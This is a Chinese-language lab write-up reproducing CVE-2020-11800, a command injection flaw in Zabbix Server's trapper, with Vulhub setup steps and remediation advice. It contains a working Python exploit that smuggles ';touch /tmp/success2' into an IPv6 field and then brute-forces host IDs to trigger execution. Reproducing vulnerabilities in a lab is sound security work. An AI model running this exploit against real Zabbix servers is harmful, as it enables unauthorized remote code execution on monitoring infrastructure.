#  CVE-2020-11800 Zabbix 命令注入漏洞复现   
 海狼风暴团队   2025-06-04 09:48  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞简述**  
  
  
Zabbix Server的Trapper Command功能存在代码执行漏洞，攻击者可通过 IPv6 进行绕过并注入任意命令，导致远程代码执行。  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**受影响版本**  
  
  
Zabbix 3.0.x~3.0.30  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
# 知识扩展  
  
  
  
Zabbix 是由 Alexei Vladishev 开发的网络监控系统，采用 Server-Client 架构，支持实时监控、报警机制、性能统计和数据可视化，用于保障服务器安全运营并快速定位问题。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
  
  
  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
**漏洞环境搭建**  
  
  
1.克隆 VulHub 仓库到本地  
```
git clone https://bgithub.xyz/vulhub/vulhub.git
```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibATRa7yqFTQTeYAWaz3icPicvicfrnSvjm1vURtxiapHR8eSb2U52RyXBhA/640?wx_fmt=png&from=appmsg "")  
  
2. 进入到vulhub的目录  
```
cd vulhub/zabbix/CVE-2020-11800
docker-compose up -d
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdGWbVJksPRI5iaiakXlLGoBwwdeaxsIGUsLMibeNWT8MXJV3nGriaA9LXPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdWChMF0O9GJugXTiaicTDjsmjQdsiaTQpjUQfCbXXdEEqJU3TrMpYUJk0w/640?wx_fmt=png&from=appmsg "")  
  
  
3.在靶机对Zabbix进行配置，登录页面默认账号密码admin/zabbix，输入后，登录成功。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdiakHsfG6fwMs4Ih4ao1fqgyto0nSgbUFrGialQHE2CIdXuPCUTaQSkIw/640?wx_fmt=png&from=appmsg "")  
  
  
4.本漏洞的前提条件是Zabbix开启自动注册功能，下面在靶机进行配置。  
  
进入Configuration->Actions后，选择Auto registration，点击Create action  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdxemZXlXTzfahp6PKv48Dia8YmXqibbwDia4U11zQvATibfqHIpdVtF8wNA/640?wx_fmt=png&from=appmsg "")  
  
  
name随便输入  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqd2eVnjYTSWyGHJicg73sZto9WmibzrXFnOBE2EBuSROsSbkH693tiaib5ibw/640?wx_fmt=png&from=appmsg "")  
  
进入Operations，type选择Add Host，然后点击Add添加，再点击Add保存。  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdQREJpsk7XVaY2IyDOHBUHfKdDicl1lyS660XRPUxS5tmkMhcIB5accA/640?wx_fmt=png&from=appmsg "")  
  
  
5.至此，靶机漏洞环境搭建完毕。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞验证**  
  
1. 利用互联网公开POC攻击:  
  
```
python 1.py 192.168.23.17
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdgWeZHFgfDQicibJ1cR0ibfr2Nw7aAkpUTOAGf8qiaedgcJKeDkibIuNs4TA/640?wx_fmt=png&from=appmsg "")  
  
```
import sys
import socket
import json
import sys
def send(ip, data):
    conn=socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data=conn.recv(2048)
    conn.close()
    return data
target=sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}))
for i in range(10000, 10500):
    data=send(target, {"request":"command","scriptid":1,"hostid":str(i)})
    if data and b'failed'not in data:
        print('hostid: %d'%i)
        print(data)
```  
  
  
2.在靶机进行查看，发现/tmp目录下success2文件已经成功写入。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdLPMHv6NhW21JSHTacm7Y3icatJyhVrPNMX1293ELpk2zibQJ0MWwYoLA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**修复建议**  
  
  
1.升级Zabbix至最新版本；  
  
2.关闭自动注册功能：  
  
进入 Configuration -> Actions。找到与Auto registration相关的Action，将其禁用或删除。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdCmqgTlibniboI9eFs2psr6wIiaQDvqpRz1pektmgM4ldiatRnpZNlDSWoQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqdgCCRfcwjwNqmncH5NWfKdNyzP5dYwHfxcic5RGhQRWdRbBVXibm5Z4Lw/640?wx_fmt=png&from=appmsg "")  
  
再利用脚本进行攻击：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgibwBXcUbBeRmFgOacnibasqduWAl1wjNLVWAe0ghCLiaWRBsOJK9uJGNI7iaCZYy9konfRAAATEPic89g/640?wx_fmt=png&from=appmsg "")  
  
可以看出来有效防御攻击。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicyK2l6sBbOia5wH5EwBiah4b8FiazcPnWoUwjVwhSmc8lNeib3HjMTM7t0fhtMK2z1Ascmib43KO9ibKlA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/WDYXfeKIYgicyK2l6sBbOia5wH5EwBiah4brzc4jKudCwzrLBkS3hDozqGufm3H1Za9VXuNGjGwscBhYnuyxAc05g/640?wx_fmt=jpeg&from=appmsg "undefined")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicyK2l6sBbOia5wH5EwBiah4b8FiazcPnWoUwjVwhSmc8lNeib3HjMTM7t0fhtMK2z1Ascmib43KO9ibKlA/640?wx_fmt=png&from=appmsg "")  
  
**- 扫码立即关注 -**  
  
                             
  
